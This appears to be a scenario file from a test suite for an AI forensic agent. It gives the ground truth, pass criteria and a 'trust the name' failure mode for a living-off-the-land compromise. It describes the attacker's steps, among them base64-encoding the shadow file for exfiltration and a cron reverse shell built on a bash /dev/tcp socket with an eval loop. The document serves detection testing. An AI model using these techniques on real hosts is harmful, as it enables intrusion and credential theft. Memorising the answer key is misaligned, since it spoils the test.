# Scenario 12 — Living-off-the-land (LotL, no dropped binaries)

**Ground truth: compromised.** The `deploy` CI account was taken over
(stolen key used from `198.51.100.42`, visible on auth.log line 8)
and the attacker performed post-compromise recon + planted persistence
without dropping a single new binary.

## Why this matters for hallucination testing

findevil's detection heuristics target *artifacts*: specific filenames
(`/tmp/.x`), specific binaries (`nc`, `wget`), specific patterns
(`ld.so.preload`, authorized_keys). A LotL attacker never drops any
of those. The attacker used:

- `find` for SUID binary enumeration and writable-directory discovery
- `awk` / `cut` for /etc/passwd parsing
- `base64` for shadow-file encoding (exfiltration over terminal paste)
- `tee` for writing the persistence cron entry
- `/dev/tcp` as the reverse-shell transport — a bash builtin, not nc

The reverse shell in `/etc/cron.d/log-rotation-check` uses:
- base64-encoded C2 IP+port to evade literal-IP matching
- `exec 3<>/dev/tcp/${_H}/${_P}` — bash builtin socket, no external binary
- `eval` loop consuming commands from fd 3

## Expected detection

- `auth_sudo_commands` should surface the `tee /etc/cron.d/log-rotation-check`
  and the unusual source IP `198.51.100.42` for `deploy`
- `find_persistence` should flag the cron file (it's under `/etc/cron.d/`
  which the scanner enumerates)
- The bash_history in `/home/deploy/.bash_history` is the most
  self-evidencing artifact — it records the whole LotL sequence

## Pass criteria

**Required:**
- `198.51.100.42` (the attacker source IP in auth.log)
- `log-rotation-check` or `cron.d` (the persistence path)
- `compromise` verdict

**Strong pass indicator (judged separately):** the report notes that
no new binaries were dropped / the attack used only built-in tools /
the reverse shell uses `/dev/tcp` and a base64-encoded IP.

**Failure mode:** agent runs findevil's `find_webshells` on the web
root, gets zero (correct — no webshell here), runs `find_persistence`
on the filesystem, sees the cron entry but dismisses it as a harmless
"log rotation health check" (as its name claims), concludes the host
is clean. This is the "trust the name" failure.
